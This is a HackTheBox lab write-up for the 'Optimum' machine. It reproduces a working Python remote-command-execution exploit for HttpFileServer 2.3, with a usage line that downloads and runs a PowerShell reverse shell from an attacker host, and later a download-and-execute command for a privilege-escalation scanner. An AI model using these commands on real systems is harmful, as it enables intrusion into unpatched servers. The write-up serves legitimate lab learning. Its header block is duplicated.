---
layout: default
title: Optimum
parent: HackTheBox
nav_order: 7
---
# Navigation Structure
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

![](pictures/logo-optimum.png)

- Summary
- Recon
- Exploitation
- Privilege Escalation
{:toc}

## [](#header-2)Summary:

- Enumerate Vulnerable version of file server
- Exploit vulnerability to pop powershell...shell
- Escalate privileges with MS01632


# Navigation Structure
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

![](pictures/logo-optimum.png)

- Summary
- Recon
- Exploitation
- Privilege Escalation
{:toc}

## [](#header-2)Summary:

- Enumerate Vulnerable version of file server
- Exploit vulnerability to pop powershell...shell
- Escalate privileges with MS01632


## [](#header-2)Recon:

Before my nmap scan was even done I found something interesting in the home page.

![](pictures/site-optimum.png)

I am able to see that the service running on port 80 is a server "HttpFileServer 2.3".

I do a searchsploit of HttpFileServer 2.3 and find exactly what I was looking for.


![](pictures/ssploit-optimum.png)

```bash
# Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 28-11-2020
# Remote: Yes
# Exploit Author: Óscar Andreu
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287

#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)

except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)
```


## [](#header-2)Exploitation:

In order for the exploit to work you need to give the target server a command to run. 

I chose Invoke-PowershellTCP.ps1 and I had to edit it in order to allow the script to run a reverse shell

![](pictures/edit-optimum.png)

Then after running the exploit and setting up our nc listener/ local python server(I renamed Invoke reverse shell to mini-reverse.ps1 on accident)

![](pictures/cm-optimum.png)

Annnnd we get some access
![](pictures/user-optimum.png)



## [](#header-2)Privilege Escalation:

Going through the motions with privesc for a Windows box, I start out with a simple systeminfo command to see what I'm working with.

![](pictures/systeminfo-optimum.png)


From here in order to automate the privesc search process I downloaded from my local python server, Sherlock written by RastaMouse
```powershell
PS C:\Users\kostas\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Sherlock/Sherlock.ps1')
```

Runnning Sherlock the system appears vulnerable to the following:

```powershell
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
```
I used powershell empire's MS01632 exploit to automate this process and was able to get root

![](pictures/root-optimum.png)



This lab was a good walk through to learn certain privilege escalation techniques/methodologies within Windows.